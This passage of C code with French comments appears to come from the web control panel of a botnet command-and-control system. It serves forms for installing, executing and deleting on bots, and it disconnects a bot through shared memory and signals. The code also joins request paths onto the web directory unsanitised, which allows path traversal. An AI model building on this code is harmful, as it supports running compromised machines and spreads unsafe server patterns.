      shmid_service = createSHM(KEY_SERVICE, service_length);

      //Ecriture de l'ID de la commande
      int command_id = ID_QUIT;
      writeSHM_int(KEY_COMMAND_ID, &command_id, sizeof(int));

      //Ecriture de l'ip du bot et de sa taille
      writeSHM_int(KEY_HOST_LENGTH, &host_length, sizeof(int));
      writeSHM_unsigned_char(KEY_HOST, host, host_length);

      //Ecriture du port du bot et de sa taille
      writeSHM_int(KEY_SERVICE_LENGTH, &service_length, sizeof(int));
      writeSHM_unsigned_char(KEY_SERVICE, service, service_length);

      //Lecture du PID du C&C
      pid_t* candc_pid;
      candc_pid = readSHM_int(KEY_CANDC_PID, sizeof(pid_t));

      kill(*candc_pid, SIGUSR1);

      printf("\nServer > User asks to disconnect C&C from a bot (host : %s, service : %s)\n", host, service);

      while(received_SHM != 1){}
      received_SHM = 0;

      //Entier d'installation
      int* disconnect;
      disconnect = readSHM_int(KEY_DISCONNECT, sizeof(int));

      //Bout de code HTML pour le site WEB
      FILE* html_content = fopen("./www/content.html", "w+");
      char done[MAX_BUFFER] = "";

      if(*disconnect == 0) {strcpy(done, "<b>Bot disconnected</b><br/>"); printf("C&C > Bot disconnected\n");}
      else {strcpy(done, "<b>Bot isn't connected</b><br/>"); printf("C&C > Bot isn't connected\n");}

      if(html_content != NULL){
        fwrite(done, 1, strlen(done), html_content);
        fclose(html_content);
      }

      detachSHM(disconnect);

      kill(*candc_pid, SIGUSR2);

      free(service);
      free(host);

      detachSHM(candc_pid);

      deleteSHM(shmid_service);
      deleteSHM(shmid_service_length);
      deleteSHM(shmid_host);
      deleteSHM(shmid_host_length);
      deleteSHM(shmid_command_id);
    }
  }

  if(strcasecmp(cmd,"GET") == 0 || strcasecmp(cmd,"POST") == 0){
    int code=CODE_OK;
    struct stat fstat;
    sprintf(path,"%s%s",WEB_DIR,page);

    if(stat(path,&fstat) != 0 || !S_ISREG(fstat.st_mode)){
      sprintf(path,"%s/%s",WEB_DIR,PAGE_NOTFOUND);
      code=CODE_NOTFOUND;
    }

    if(strcmp(page, "/form.html") == 0){
      struct stat sstat;
      stat("./www/host_list.html", &sstat);
      fstat.st_size += 6*sstat.st_size;
      stat("./www/form_install.html", &sstat);
      fstat.st_size += sstat.st_size;
      stat("./www/form_exec.html", &sstat);
      fstat.st_size += sstat.st_size;
      stat("./www/form_del.html", &sstat);
      fstat.st_size += sstat.st_size;
      stat("./www/form_stat.html", &sstat);
      fstat.st_size += sstat.st_size;
      stat("./www/form_res.html", &sstat);
      fstat.st_size += sstat.st_size;
      stat("./www/form_quit.html", &sstat);
      fstat.st_size += sstat.st_size;
    }
    else{
      struct stat sstat;
      stat("./www/head.html", &sstat);
      fstat.st_size += sstat.st_size;
      stat("./www/content.html", &sstat);
      fstat.st_size += sstat.st_size;
      stat("./www/foot.html", &sstat);
      fstat.st_size += sstat.st_size;
    }

    strcpy(type,"text/html");
    char *end = page + strlen(page);
    if(strcmp(end-4,".png") == 0) strcpy(type,"image/png");
    if(strcmp(end-4,".jpg") == 0) strcpy(type,"image/jpg");
    if(strcmp(end-4,".gif") == 0) strcpy(type,"image/gif");
    fprintf(dialog,"HTTP/1.0 %d\r\n",code);
    fprintf(dialog,"Server: CWeb\r\n");
    fprintf(dialog,"Content-type: %s\r\n",type);
    fprintf(dialog,"Content-length: %ld\r\n",fstat.st_size);
    fprintf(dialog,"\r\n");
    fflush(dialog);

    if(strcmp(page, "/form.html") == 0){
      displayHtml(path, dialog);
      displayHtml("./www/host_list.html", dialog);
      displayHtml("./www/form_install.html", dialog);
      displayHtml("./www/host_list.html", dialog);
      displayHtml("./www/form_exec.html", dialog);
      displayHtml("./www/host_list.html", dialog);
      displayHtml("./www/form_del.html", dialog);
      displayHtml("./www/host_list.html", dialog);
      displayHtml("./www/form_res.html", dialog);
      displayHtml("./www/host_list.html", dialog);
      displayHtml("./www/form_stat.html", dialog);
      displayHtml("./www/host_list.html", dialog);
      displayHtml("./www/form_quit.html", dialog);
    }
    else{
      displayHtml(path, dialog);
      displayHtml("./www/head.html", dialog);
      displayHtml("./www/content.html", dialog);
      displayHtml("./www/foot.html", dialog);
    }
  }
  fclose(dialog);
  return 0;
}

void serverTCP(){
	int s;
  char *port = "4040";
  /* Initialisation du serveur */
  s=initialisationServeur(port, MAX_CONNEXIONS);
  /* Lancement de la boucle d'ecoute */
  boucleServeurTCP(s, manageWebClient);
  shutdown(s, SHUT_RDWR);
}

/** Main procedure **/

int main(void){
  initSHM();

  action.sa_handler = handler;
  action.sa_flags = SA_RESTART;
  sigaction(SIGINT, &action, NULL);
  sigaction(SIGUSR1, &action, NULL);
  sigaction(SIGUSR2, &action, NULL);

  serverTCP();

  deleteSHM(shmid_server_pid);

  return 0;
}
